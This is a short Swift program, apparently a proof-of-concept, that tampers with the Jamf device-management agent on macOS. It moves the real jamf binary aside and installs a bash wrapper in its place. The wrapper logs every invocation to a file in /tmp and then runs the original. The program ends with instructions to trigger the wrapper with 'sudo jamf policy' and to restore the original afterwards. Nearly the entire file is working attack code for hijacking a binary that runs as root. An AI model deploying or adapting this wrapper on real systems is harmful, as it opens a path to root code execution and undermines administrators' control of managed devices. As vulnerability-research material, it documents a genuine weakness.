import Foundation

let jamfPath = "/usr/local/jamf/bin/jamf"
let jamfBackup = "/usr/local/jamf/bin/jamf.real"
let proofLog = "/tmp/JAMF_proof.txt"

let wrapper = """
#!/bin/bash
echo "[$(date)] JAMF Tampering Success - args: $@" >> \(proofLog)
exec \(jamfBackup) "$@"
"""

let fm = FileManager.default

// Step 1: Backup original jamf binary
guard fm.fileExists(atPath: jamfPath) else {
    print("[ERROR] jamf binary not found at \(jamfPath)")
    exit(1)
}

if fm.fileExists(atPath: jamfBackup) {
    print("[SKIP] Backup already exists at \(jamfBackup)")
} else {
    do {
        try fm.moveItem(atPath: jamfPath, toPath: jamfBackup)
        print("[OK] Moved original jamf to \(jamfBackup)")
    } catch {
        print("[ERROR] Failed to move jamf binary: \(error.localizedDescription)")
        exit(1)
    }
}

// Step 2: Create wrapper script
do {
    try wrapper.write(toFile: jamfPath, atomically: true, encoding: .utf8)
    print("[OK] Wrapper script written to \(jamfPath)")
} catch {
    print("[ERROR] Failed to write wrapper: \(error.localizedDescription)")
    // Rollback
    try? fm.moveItem(atPath: jamfBackup, toPath: jamfPath)
    exit(1)
}

// Set executable permission (755)
let attrs: [FileAttributeKey: Any] = [.posixPermissions: 0o755]
do {
    try fm.setAttributes(attrs, ofItemAtPath: jamfPath)
    print("[OK] Set executable permissions on wrapper")
} catch {
    print("[ERROR] Failed to set permissions: \(error.localizedDescription)")
    exit(1)
}

print("\n[DONE] JAMF tampering POC deployed")
print("  Proof log: \(proofLog)")
print("  Run 'sudo jamf policy' to trigger")
print("  Cleanup: sudo mv \(jamfBackup) \(jamfPath)")
